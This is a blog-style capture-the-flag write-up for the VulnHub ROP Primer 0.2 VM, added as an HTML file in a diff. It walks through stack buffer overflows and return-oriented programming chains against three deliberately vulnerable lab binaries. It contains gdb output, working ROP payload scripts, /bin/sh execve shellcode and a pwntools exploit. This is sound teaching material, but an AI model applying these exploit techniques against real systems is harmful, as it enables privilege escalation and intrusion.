@@ -1,0 +1,807 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+      <title>g0blin Research: ROP Primer: 0.2 VulnHub Writeup</title>
+    <link rel="stylesheet" href="/css/bootstrap.css"/>
+    <link rel="stylesheet" href="/css/prism.css"/>
+    <link href='https://fonts.googleapis.com/css?family=Raleway' rel='stylesheet' type='text/css'>
+    <style type="text/css">
+      body {font-family: 'Raleway', "Helvetica Neue", Helvetica, Arial, sans-serif}
+      article {overflow:hidden}
+      code, pre {font-family: Consolas, Monaco, 'Andale Mono', 'Lucida Console', monospace; hyphens: none}
+      pre {max-height: 30em;overflow: auto}
+      pre > code.highlight {outline: .4em solid red;outline-offset: .4em}
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="row">
+        <div class="col-xs-12" style="background:#337ab7">
+          <h1 style="margin-top:10px;">
+            <a href="/" style="color: #fff">g0blin Research</a>
+          </h1>
+        </div>
+      </div>
+      <div class="row">
+        <div class="col-xs-12" style="background:#144773">
+          <p class="text-right" style="margin-bottom:0px">
+            <a href="https://twitter.com/g0blinResearch" target="_blank" style="color: #fff">Follow @g0blinResearch</a>
+          </p>
+        </div>
+      </div>
+
+<div class="row">
+  <div class="col-xs-12">
+    <article>
+      <h2>ROP Primer: 0.2 VulnHub Writeup</h2>
+        <ol class="toc">
+          <li><a href="#preface">Preface</a></li>
+          <li><a href="#level-0">Level 0</a></li>
+          <li><a href="#level-1">Level 1</a></li>
+          <li><a href="#level-2">Level 2</a></li>
+          <li><a href="#conclusion">Conclusion</a></li>
+        </ol>
+      <p><p>A couple of weeks ago, I noticed a <a href="http://barrebas.github.io/blog/2015/10/04/lord-of-the-root/">solution</a> to <a href="https://www.vulnhub.com/entry/lord-of-the-root-101,129/">Lord of the Root</a> posted by VulnHubs own <a href="https://twitter.com/@barrebas">Bas</a>. Bas's solution used a methodology called ROP (Return Oriented Programming) to solve the challenge. Bas just so happened to of created a VM to assist others in learning the ropes of ROPs. As I missed his talk at BSides London 2015, and ROP was something I've had very little experience with, I decided to give his VM a go. I present to you - <a href="https://www.vulnhub.com/entry/rop-primer-02,114/">ROP Primer: 0.2</a></p>
+<h3 id="preface">Preface</h3>
+<p>This was a slightly different experience for me, compared to the other VulnHub images, as I went into this with the intention of learning how to ROP (or at least coming out with a better understanding of the methodology). While the VM requires you to elevate privileges, we're provided with the root user login, as well as a login for the first level. The VM also has all the tools we'll need to complete it, such as gdb, and the ever useful <a href="https://github.com/longld/peda" target="_blank">gdb-peda</a> extension.</p>
+<p>So - what is ROP? As I understand it, ROP is a method of exploitation which allows you to re-use parts of the code pre-existing in the target binary, in order to structure the stack, over-write memory, call methods, or otherwise control the execution flow of the binary. This is achieved by overwriting the stored return value in the stack, which is subsequently popped back into EIP once the teardown code is reached. By manipulating EIP to point to what's called 'gadgets' (think, small chunks of ASM that can perform specific actions), we can perform potentially any thing we want within the binary, so long as adequate gadgets exist.</p>
+<p>Let's get started!</p>
+<h3 id="level-0">Level 0</h3>
+<p>After logging in as the level0 user, I do a quick ls and notice a binary in the users directory named 'level0'. This binary has the SUID bit set, meaning if we can cause it to execute a command, it'd be executed as the owning user (in this case, the 'level1' user). In addition to the 'level0' binary, there is a file which is only readable by the user / group 'level1'.</p>
+<pre><code>-rw-r----- 1 level1 level1   25 Jan 20  2015 flag
+-rwsr-xr-x 1 level1 level1 583K Jan 20  2015 level0
+</code></pre><p>I open the binary in gdb and take a look at the code for the 'main' function.</p>
+<pre><code>gdb-peda$ disas main
+Dump of assembler code for function main:
+   0x08048254 &lt;+0&gt;:    push   ebp
+   0x08048255 &lt;+1&gt;:    mov    ebp,esp
+=&gt; 0x08048257 &lt;+3&gt;:    and    esp,0xfffffff0
+   0x0804825a &lt;+6&gt;:    sub    esp,0x30
+   0x0804825d &lt;+9&gt;:    mov    DWORD PTR [esp],0x80ab668
+   0x08048264 &lt;+16&gt;:    call   0x8048f40 &lt;puts&gt;
+   0x08048269 &lt;+21&gt;:    mov    DWORD PTR [esp],0x80ab680
+   0x08048270 &lt;+28&gt;:    call   0x8048d80 &lt;printf&gt;
+   0x08048275 &lt;+33&gt;:    lea    eax,[esp+0x10]
+   0x08048279 &lt;+37&gt;:    mov    DWORD PTR [esp],eax
+   0x0804827c &lt;+40&gt;:    call   0x8048db0 &lt;gets&gt;
+   0x08048281 &lt;+45&gt;:    lea    eax,[esp+0x10]
+   0x08048285 &lt;+49&gt;:    mov    DWORD PTR [esp+0x4],eax
+   0x08048289 &lt;+53&gt;:    mov    DWORD PTR [esp],0x80ab698
+   0x08048290 &lt;+60&gt;:    call   0x8048d80 &lt;printf&gt;
+   0x08048295 &lt;+65&gt;:    mov    eax,0x0
+   0x0804829a &lt;+70&gt;:    leave  
+   0x0804829b &lt;+71&gt;:    ret    
+End of assembler dump.
+</code></pre><p>A quick skim over this function shows a buffer overflow vulnerability. We can confirm this by inspecting the source code, provided to us on the VMs built in web server.</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main(int argc, char **argv, char **argp)
+{
+  char name[32];
+  printf("[+] ROP tutorial level0\n");
+  printf("[+] What's your name? ");
+  gets(name);
+  printf("[+] Bet you can't ROP me, %s!\n", name);
+  return 0;
+}
+</code></pre><p>Next, I create a pattern in gdb, provide it to the binary and find the offset required to overwrite EIP.</p>
+<pre><code>gdb-peda$ pattern_create 0x30
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAA'
+gdb-peda$ run
+Starting program: /home/level0/level0
+[+] ROP tutorial level0
+[+] What's your name? AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAA
+[+] Bet you can't ROP me, AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAA!
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x0
+EBX: 0x0
+ECX: 0xbffff6ac --&gt; 0x80ca720 --&gt; 0xfbad2a84
+EDX: 0x80cb690 --&gt; 0x0
+ESI: 0x80488e0 (&lt;__libc_csu_fini&gt;:    push   ebp)
+EDI: 0xb00bcd7
+EBP: 0x41304141 ('AA0A')
+ESP: 0xbffff700 --&gt; 0x0
+EIP: 0x41414641 ('AFAA')
+EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41414641
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff700 --&gt; 0x0
+0004| 0xbffff704 --&gt; 0xbffff794 --&gt; 0xbffff8be ("/home/level0/level0")
+0008| 0xbffff708 --&gt; 0xbffff79c --&gt; 0xbffff8d2 ("XDG_SESSION_ID=7")
+0012| 0xbffff70c --&gt; 0x0
+0016| 0xbffff710 --&gt; 0x0
+0020| 0xbffff714 --&gt; 0x0
+0024| 0xbffff718 --&gt; 0x0
+0028| 0xbffff71c --&gt; 0x0
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41414641 in ?? ()
+gdb-peda$ pattern_offset 0x41414641
+1094796865 found at offset: 44
+</code></pre><p>Great - we can overwrite EIP, starting at position 44.</p>
+<p>In the description of this level, we're given the hint that we could potentially use mprotect to solve it. The reason for using mprotect is so that we can make a portion of memory readable, writable and executable. This would provide us with somewhere to store our shell code, and somewhere to execute it from.</p>
+<p>Wasting no time, I find the address for the mprotect function.</p>
+<pre><code>gdb-peda$ print mprotect
+$1 = {&lt;text variable, no debug info&gt;} 0x80523e0 &lt;mprotect&gt;
+</code></pre><p>Now for the arguments required by mprotect.</p>
+<pre><code>int mprotect(void *addr, size_t len, int prot);
+</code></pre><p>So, we'll need to provide the address our target memory, the length (which needs to be page-aligned), and the protection level to apply.</p>
+<p>After doing some digging, I came across these values for the various protection levels.</p>
+<pre><code>#define PROT_READ       0x01            /* page can be read */
+#define PROT_WRITE      0x02            /* page can be written */
+#define PROT_EXEC       0x04            /* page can be executed */
+</code></pre><p>If we OR these together, we get the value of 7.</p>
+<p>We'll also need a ROP gadget to pop 3 values off of the stack after we're done, so that we are ready for the next entry in our ROP chain.</p>
+<p>To find this gadget, I use the 'ropgadget' function in gdb.</p>
+<pre><code>gdb-peda$ ropgadget
+ret = 0x8048106
+addesp_4 = 0x804a278
+popret = 0x8048550
+pop2ret = 0x8048883
+pop4ret = 0x8048881
+pop3ret = 0x8048882
+</code></pre><p>Now we need to decide which section of memory we're going to update. I get a listing of the memory maps via gdb.</p>
+<pre><code>gdb-peda$ vmmap
+Start      End        Perm    Name
+0x08048000 0x080ca000 r-xp    /home/level0/level0
+0x080ca000 0x080cb000 rw-p    /home/level0/level0
+0x080cb000 0x080ef000 rw-p    [heap]
+0xb7fff000 0xb8000000 r-xp    [vdso]
+0xbffdf000 0xc0000000 rw-p    [stack]
+</code></pre><p>I choose to pick 0xb7fff000 as our target memory.</p>
+<p>Time to setup our payload.</p>
+<pre><code>import struct
+
+eip_position = 44
+mprotect = 0x80523e0
+pop3ret = 0x8048882
+target_memory = 0xb7fff000
+
+payload = 'A' * eip_position
+payload += struct.pack('I', mprotect) # EIP to mprotect
+payload += struct.pack('I', pop3ret) # Clean stack afterwards (we return to this address after mprotect has finished)
+
+payload += struct.pack('I', target_memory) # addr
+payload += struct.pack('I', 0x2000) # len
+payload += struct.pack('I', 1 | 2 | 4) # prot (RXW)
+</code></pre><p>Next, I'm going to make a memcpy call to copy our shell code (which we'll push onto the stack) into our now executable block of memory, and then finally return to our shell code.</p>
+<p>We'll need the address of the memcpy function.</p>
+<pre><code>gdb-peda$ print memcpy
+$1 = {&lt;text variable, no debug info&gt;} 0x8051500 &lt;memcpy&gt;
+</code></pre><p>The memcpy function takes three arguments. Destination, source, and length.</p>
+<pre><code>void * memcpy ( void * destination, const void * source, size_t num );
+</code></pre><p>Time to setup our final payload.</p>
+<pre><code>import struct
+
+eip_position = 44
+mprotect = 0x80523e0
+memcpy = 0x8051500
+pop3ret = 0x8048882
+target_memory = 0xb7fff000
+
+payload = 'A' * eip_position
+
+payload += struct.pack('I', mprotect) # EIP to mprotect
+payload += struct.pack('I', pop3ret) # Clean stack afterwards
+
+payload += struct.pack('I', target_memory) # addr
+payload += struct.pack('I', 0x2000) # len
+payload += struct.pack('I', 1 | 2 | 4) # prot
+
+payload += struct.pack('I', memcpy) # call memcpy
+payload += struct.pack('I', target_memory) # return to target_memory
+
+payload += struct.pack('I', target_memory) # dst
+payload += struct.pack('I', 0xbffff724) # src - found by inspecting the stack prior to memcpy being called
+
+shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80' # generated in gdb, by calling gdb shellcode x86/linux exec
+
+payload += struct.pack('I', len(shellcode)) # len
+
+payload += shellcode
+
+print payload
+</code></pre><p>Now, the above payload works fine in gdb.</p>
+<pre><code>gdb-peda$ run &lt; $(python level0.py)
+Starting program: /home/level0/level0 &lt; $(python level0.py)
+[+] ROP tutorial level0
+[+] What's your name? [+] Bet you can't ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��!
+process 3177 is executing new program: /bin/dash
+[Inferior 1 (process 3177) exited normally]
+Warning: not running or target is remote
+</code></pre><p>However it fails on the command line. It simply sits waiting for input, and when you provide input, it seg faults.</p>
+<pre><code>level0@rop:~$ (python input.py; cat) | ./level0
+[+] ROP tutorial level0
+[+] What's your name? [+] Bet you can't ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��!
+
+Segmentation fault
+</code></pre><p>I guess that the stack position has changed from the one in gdb. As ASLR is disabled, it should be a simple matter of finding the new offset.</p>
+<p>I enable core dumps, and look for our shellcode in the stack.</p>
+<pre><code>level0@rop:~$ ulimit -c unlimited
+level0@rop:~$ cp level0 level0b
+level0@rop:~$ (python input.py; cat) | ./level0b
+[+] ROP tutorial level0
+[+] What's your name? [+] Bet you can't ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��!
+id
+Segmentation fault (core dumped)
+level0@rop:~$ gdb -q level0b core
+Reading symbols from level0b...(no debugging symbols found)...done.
+[New LWP 3261]
+Failed to read a valid object file image from memory.
+Core was generated by `./level0b'.
+Program terminated with signal SIGSEGV, Segmentation fault.
+#0  0xb7fff00c in ?? ()
+gdb-peda$ hexdump 0xbffff724 /6
+0xbffff724 : 41 41 41 41 41 41 41 41 00 00 00 00 82 88 04 08   AAAAAAAA........
+0xbffff734 : 00 f0 ff b7 00 f0 ff b7 00 20 00 00 07 00 00 00   ......... ......
+0xbffff744 : 00 f0 ff b7 00 f0 ff b7 24 f7 ff bf 18 00 00 00   ........$.......
+0xbffff754 : 31 c0 50 68 2f 2f 73 68 68 2f 62 69 6e 89 e3 31   1.Ph//shh/bin..1
+0xbffff764 : c9 89 ca 6a 0b 58 cd 80 00 00 00 00 00 00 00 00   ...j.X..........
+0xbffff774 : 00 00 00 00 00 00 00 00 35 fd 77 b6 00 00 00 00   ........5.w.....
+</code></pre><p>Great - I can see the start of our shell code at 0xbffff754. I update the layload, and execute it again.</p>
+<pre><code>level0@rop:~$ (python input.py; cat) | ./level0
+[+] ROP tutorial level0
+[+] What's your name? [+] Bet you can't ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��!
+id
+uid=1000(level0) gid=1000(level0) euid=1001(level1) groups=1001(level1),1000(level0)
+</code></pre><p>Boom! Time to read our flag.</p>
+<pre><code>cat flag
+flag{rop_the_night_away}
+</code></pre><h3 id="level-1">Level 1</h3>
+<p>After inspecting the source of the application, I suspect that the vulnerability is in the line that accepts the filename. It takes the previously provided file length as the input length, even though the buffer for the filename is only 32 bytes long.</p>
+<pre><code>memset(filename, 0, sizeof(filename));
+read_bytes = read(fd, filename, filesize);
+</code></pre><p>So, we can perform a buffer overflow here, and hopefully start our ROP chain.</p>
+<p>In order to interactively debug this, I login with the 'level1' user and start up gdb. I then set a break point where the port number is set, and change it to another port (8889).</p>
+<pre><code>level1@rop:~$ gdb level1
+gdb-peda$ break *main+115
+Breakpoint 1 at 0x8048d8c
+gdb-peda$ run
+Starting program: /home/level1/level1
+[----------------------------------registers-----------------------------------]
+EAX: 0x0
+EBX: 0xb7fd0000 --&gt; 0x1aada8
+ECX: 0x10
+EDX: 0xbffff6e4 --&gt; 0xb7fff000 --&gt; 0x20f34
+ESI: 0x0
+EDI: 0x0
+EBP: 0xbffff6f8 --&gt; 0x0
+ESP: 0xbffff6c0 --&gt; 0x22b8
+EIP: 0x8048d8c (&lt;main+115&gt;:    call   0x8048670 &lt;htons@plt&gt;)
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048d7c &lt;main+99&gt;:    call   0x8048750 &lt;htonl@plt&gt;
+   0x8048d81 &lt;main+104&gt;:    mov    DWORD PTR [esp+0x18],eax
+   0x8048d85 &lt;main+108&gt;:    mov    DWORD PTR [esp],0x22b8
+=&gt; 0x8048d8c &lt;main+115&gt;:    call   0x8048670 &lt;htons@plt&gt;
+   0x8048d91 &lt;main+120&gt;:    mov    WORD PTR [esp+0x16],ax
+   0x8048d96 &lt;main+125&gt;:    jmp    0x8048dbc &lt;main+163&gt;
+   0x8048d98 &lt;main+127&gt;:    mov    DWORD PTR [esp],0x80491c9
+   0x8048d9f &lt;main+134&gt;:    call   0x80486a0 &lt;puts@plt&gt;
+Guessed arguments:
+arg[0]: 0x22b8
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff6c0 --&gt; 0x22b8
+0004| 0xbffff6c4 --&gt; 0x0
+0008| 0xbffff6c8 --&gt; 0x10
+0012| 0xbffff6cc --&gt; 0x8048eeb (&lt;__libc_csu_init+75&gt;:    add    esi,0x1)
+0016| 0xbffff6d0 --&gt; 0x1
+0020| 0xbffff6d4 --&gt; 0x2
+0024| 0xbffff6d8 --&gt; 0x0
+0028| 0xbffff6dc --&gt; 0x0
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x08048d8c in main ()
+gdb-peda$ set {int}0xbffff6c0 = 8889
+gdb-peda$ c
+</code></pre><p>Now I can connect on port 8889 and check our assumption.</p>
+<p>After inspecting the binary in Hopper (ok, I'm lazy..), I can see that the setup for the above two lines exists at position 0x8048af0.</p>
+<pre><code>08048af0         mov        dword [ss:esp+0x8], 0x20                            ; argument "len" for method j_memset
+08048af8         mov        dword [ss:esp+0x4], 0x0                             ; argument "c" for method j_memset
+08048b00         lea        eax, dword [ss:ebp+var_3C]
+08048b03         mov        dword [ss:esp], eax                                 ; argument "b" for method j_memset
+08048b06         call       j_memset
+08048b0b         mov        eax, dword [ss:ebp+var_C]
+08048b0e         mov        dword [ss:esp+0x8], eax                             ; argument "nbyte" for method j_read
+08048b12         lea        eax, dword [ss:ebp+var_3C]
+08048b15         mov        dword [ss:esp+0x4], eax                             ; argument "buf" for method j_read
+08048b19         mov        eax, dword [ss:ebp+arg_0]
+08048b1c         mov        dword [ss:esp], eax                                 ; argument "fildes" for method j_read
+08048b1f         call       j_read
+</code></pre><p>I set a breakpoint at 0x8048b1f, so that I can check the arguments being passed in to read, so I Can be sure that the length of the file is actually being used when reading in the length of the file name.</p>
+<p>After entering a file size of 50, and then entering a string of 49 'A' characters and hitting enter (bringing the length up to 50), the breakpoint is hit.</p>
+<pre><code>=&gt; 0x8048b1f &lt;handle_conn+522&gt;:    call   0x8048640 &lt;read@plt&gt;
+   0x8048b24 &lt;handle_conn+527&gt;:    mov    DWORD PTR [ebp-0x14],eax
+   0x8048b27 &lt;handle_conn+530&gt;:    lea    eax,[ebp-0x3c]
+   0x8048b2a &lt;handle_conn+533&gt;:    mov    DWORD PTR [esp+0xc],eax
+   0x8048b2e &lt;handle_conn+537&gt;:    mov    DWORD PTR [esp+0x8],0x80490ac
+Guessed arguments:
+arg[0]: 0x4
+arg[1]: 0xbffff67c --&gt; 0x0
+arg[2]: 0x32 ('2')
+</code></pre><p>Great - the length provided to the 'read' function is 0x32, or 50. This means we can overflow the buffer, and start ROPing. Time to find the EIP offset.</p>
+<p>In my first tab, I attach gdb to level 1 and repeat the previous steps to change the port number. I also generate a pattern with a length of 128.</p>
+<pre><code>level1@rop:~$ gdb -q level1
+Reading symbols from level1...(no debugging symbols found)...done.
+gdb-peda$ pattern_create 128
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA'
+gdb-peda$ break *main+115
+Breakpoint 1 at 0x8048d8c
+gdb-peda$ r
+Starting program: /home/level1/level1
+[----------------------------------registers-----------------------------------]
+EAX: 0x0
+EBX: 0xb7fd0000 --&gt; 0x1aada8
+ECX: 0x10
+EDX: 0xbffff6e4 --&gt; 0xb7fff000 --&gt; 0x20f34
+ESI: 0x0
+EDI: 0x0
+EBP: 0xbffff6f8 --&gt; 0x0
+ESP: 0xbffff6c0 --&gt; 0x22b8
+EIP: 0x8048d8c (&lt;main+115&gt;:    call   0x8048670 &lt;htons@plt&gt;)
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048d7c &lt;main+99&gt;:    call   0x8048750 &lt;htonl@plt&gt;
+   0x8048d81 &lt;main+104&gt;:    mov    DWORD PTR [esp+0x18],eax
+   0x8048d85 &lt;main+108&gt;:    mov    DWORD PTR [esp],0x22b8
+=&gt; 0x8048d8c &lt;main+115&gt;:    call   0x8048670 &lt;htons@plt&gt;
+   0x8048d91 &lt;main+120&gt;:    mov    WORD PTR [esp+0x16],ax
+   0x8048d96 &lt;main+125&gt;:    jmp    0x8048dbc &lt;main+163&gt;
+   0x8048d98 &lt;main+127&gt;:    mov    DWORD PTR [esp],0x80491c9
+   0x8048d9f &lt;main+134&gt;:    call   0x80486a0 &lt;puts@plt&gt;
+Guessed arguments:
+arg[0]: 0x22b8
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff6c0 --&gt; 0x22b8
+0004| 0xbffff6c4 --&gt; 0x0
+0008| 0xbffff6c8 --&gt; 0x10
+0012| 0xbffff6cc --&gt; 0x8048eeb (&lt;__libc_csu_init+75&gt;:    add    esi,0x1)
+0016| 0xbffff6d0 --&gt; 0x1
+0020| 0xbffff6d4 --&gt; 0x2
+0024| 0xbffff6d8 --&gt; 0x0
+0028| 0xbffff6dc --&gt; 0x0
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x08048d8c in main ()
+gdb-peda$ set {int}0xbffff6c0 = 8889
+gdb-peda$ c
+Continuing.
+</code></pre><p>In a second tab, I connect to the server, state that my file is 128 bytes long, provide 127 bytes (plus a linebreak) as the content, and then provide the full 128 byte pattern as the file name.</p>
+<pre><code>11:42 ~: nc 10.200.0.101 8889
+    Welcome to
+     XERXES File Storage System
+      available commands are:
+      store, read, exit.
+
+    &gt; store
+     Please, how many bytes is your file?
+
+    &gt; 128
+     Please, send your file:
+
+    &gt; AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAO
+       XERXES is pleased to inform you
+        that your file was received
+            most successfully.
+     Please, give a filename:
+    &gt; AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA
+</code></pre><p>Back in the first tab (the gdb session), we note that a segfault has occurred. Using the 'pattern_offset' function, we can find the offset required to overwrite EIP.</p>
+<pre><code>[New process 3608]
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 3608]
+[----------------------------------registers-----------------------------------]
+EAX: 0xffffffff
+EBX: 0xb7fd0000 --&gt; 0x1aada8
+ECX: 0xb7e248fc --&gt; 0x9 ('\t')
+EDX: 0x26 ('&amp;')
+ESI: 0x0
+EDI: 0x0
+EBP: 0x48414132 ('2AAH')
+ESP: 0xbffff6c0 ("A3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA\203\352\343\267\001")
+EIP: 0x41644141 ('AAdA')
+EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41644141
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff6c0 ("A3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA\203\352\343\267\001")
+0004| 0xbffff6c4 ("IAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA\203\352\343\267\001")
+0008| 0xbffff6c8 ("AA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA\203\352\343\267\001")
+0012| 0xbffff6cc ("AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA\203\352\343\267\001")
+0016| 0xbffff6d0 ("fAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA\203\352\343\267\001")
+0020| 0xbffff6d4 ("AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA\203\352\343\267\001")
+0024| 0xbffff6d8 ("AgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA\203\352\343\267\001")
+0028| 0xbffff6dc ("6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA\203\352\343\267\001")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41644141 in ?? ()
+gdb-peda$ pattern_offset 0x41644141
+1097089345 found at offset: 64
+</code></pre><p>Cool - so we can overwrite EIP at position 64. Time to get our ROP on!</p>
+<p>Going on the hints in the description of this level, it looks like we could use the functions 'open', 'read' and 'write' in order to open the flag file, read it into memory, and then write it out to our socket.</p>
+<p>First things first, I set a breakpoint on the handle_conn method to find out what value I'll need to provide as my file descriptor when writing back to our socket.</p>
+<pre><code>=&gt; 0x8048915 &lt;handle_conn&gt;:    push   ebp
+   0x8048916 &lt;handle_conn+1&gt;:    mov    ebp,esp
+   0x8048918 &lt;handle_conn+3&gt;:    sub    esp,0x178
+   0x804891e &lt;handle_conn+9&gt;:    mov    DWORD PTR [esp+0x4],0x8048f20
+   0x8048926 &lt;handle_conn+17&gt;:    mov    eax,DWORD PTR [ebp+0x8]
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff6bc --&gt; 0x8048e63 (&lt;main+330&gt;:    mov    eax,DWORD PTR [esp+0x28])
+0004| 0xbffff6c0 --&gt; 0x4
+</code></pre><p>Ok - our sockets file descriptor is 4.</p>
+<p>Now, from looking at the source of the binary, we should have a copy of the string 'flag' available to us.</p>
+<pre><code>gdb-peda$ find "flag"
+Searching for 'flag' in: None ranges
+Found 13 results, display max 13 items:
+    level1 : 0x8049128 ("flag")
+    level1 : 0x804a128 ("flag”)
+</code></pre><p>Cool, cool.</p>
+<p>Next, for the addresses of our various methods. Note that I'm re-using the 'write_buf' method that is available to us, to ever so slightly simplify our payload.</p>
+<pre><code>gdb-peda$ print open
+$1 = {&lt;text variable, no debug info&gt;} 0xb7f00060 &lt;open&gt;
+gdb-peda$ print read
+$2 = {&lt;text variable, no debug info&gt;} 0xb7f004f0 &lt;read&gt;
+gdb-peda$ print write_buf
+$3 = {&lt;text variable, no debug info&gt;} 0x804889c &lt;write_buf&gt;
+</code></pre><p>We'll need somewhere to read our flag in to, as well.</p>
+<pre><code>gdb-peda$ vmmap
+Start      End        Perm    Name
+0x08048000 0x0804a000 r-xp    /home/level1/level1
+0x0804a000 0x0804b000 rw-p    /home/level1/level1
+0xb7e24000 0xb7e25000 rw-p    mapped
+0xb7e25000 0xb7fce000 r-xp    /lib/i386-linux-gnu/libc-2.19.so
+0xb7fce000 0xb7fd0000 r--p    /lib/i386-linux-gnu/libc-2.19.so
+0xb7fd0000 0xb7fd1000 rw-p    /lib/i386-linux-gnu/libc-2.19.so
+0xb7fd1000 0xb7fd4000 rw-p    mapped
+0xb7fdb000 0xb7fdd000 rw-p    mapped
+0xb7fdd000 0xb7fde000 r-xp    [vdso]
+0xb7fde000 0xb7ffe000 r-xp    /lib/i386-linux-gnu/ld-2.19.so
+0xb7ffe000 0xb7fff000 r--p    /lib/i386-linux-gnu/ld-2.19.so
+0xb7fff000 0xb8000000 rw-p    /lib/i386-linux-gnu/ld-2.19.so
+0xbffdf000 0xc0000000 rw-p    [stack]
+</code></pre><p>I choose the first writable section of memory - 0x804a000.</p>
+<p>We'll need a 'pop2ret' gadget for open, and a pop3ret gadget for 'read', so that we can clean up the stack after ourselves.</p>
+<pre><code>gdb-peda$ ropgadget
+ret = 0x804851c
+popret = 0x8048e93
+pop2ret = 0x8048ef7
+pop3ret = 0x8048ef6
+pop4ret = 0x8048ef5
+leaveret = 0x8048610
+addesp_44 = 0x8048ef2
+</code></pre><p>We've now got everything we need - time to build our payload. This time round, I've chosen to use the <a href="https://github.com/Gallopsled/pwntools" target="_blank">pwntools</a> library for Python, to simplify the network exploitation step.</p>
+<pre><code>from pwn import *
+
+eip_offset = 64
+open = 0xb7f00060
+read = 0xb7f004f0
+write_buf = 0x804889c
+
+pop2ret = 0x8048ef7
+pop3ret = 0x8048ef6
+
+flag = 0x8049128
+
+buf = 0x804a000
+buf_len = 0x100
+
+flag_fd = 0x3
+sock_fd = 0x4
+
+payload = 'A' * eip_offset
+payload += struct.pack('IIII', open, pop2ret, flag, 0x0)
+payload += struct.pack('IIIII', read, pop3ret, flag_fd, buf, buf_len)
+payload += struct.pack('IIII', write_buf, 0xdeadbeef, sock_fd, buf)
+
+r = remote('10.200.0.101', 8888)
+
+r.recvuntil('&gt; ')
+r.send('store\n')
+
+r.recvuntil('&gt; ')
+r.send('%d\n' % (len(payload) + 1))
+
+r.recvuntil('&gt; ')
+r.send(payload + '\n')
+
+r.recvuntil('&gt; ')
+r.send(payload)
+
+print r.recvline()
+</code></pre><p>And the result!</p>
+<pre><code>test@test-VirtualBox:~$ python level1.py
+[+] Opening connection to 10.200.0.101 on port 8888: Done
+flag{just_one_rop_chain_a_day_keeps_the_doctor_away}
+
+[*] Closed connection to 10.200.0.101 port 8888
+</code></pre><h3 id="level-2">Level 2</h3>
+<p>This challenge is pretty much identical to Level 0 - with one slight difference. Instead of using 'gets', it uses 'strcpy'. This means that the payload cannot contain NULL bytes, NL characters, or anything else strcpy will interpret as either bad, or the end of a string.</p>
+<p>First of all, I update our payload from Level 0 with the current values extract via gdb for our new binary. Following feedback from Bas, I have changed the target_memory variable to the binaries instruction range, which will not change between gdb and shell.</p>
+<pre><code>import struct
+
+eip_position = 44
+mprotect = 0x08052290
+memcpy = 0x080513b0
+pop3ret = 0x08048892
+target_memory = 0x08048000 # changed to binary memory
+
+payload = 'A' * eip_position
+
+payload += struct.pack('I', mprotect) # EIP to mprotect
+payload += struct.pack('I', pop3ret) # Clean stack afterwards
+
+payload += struct.pack('I', target_memory) # addr
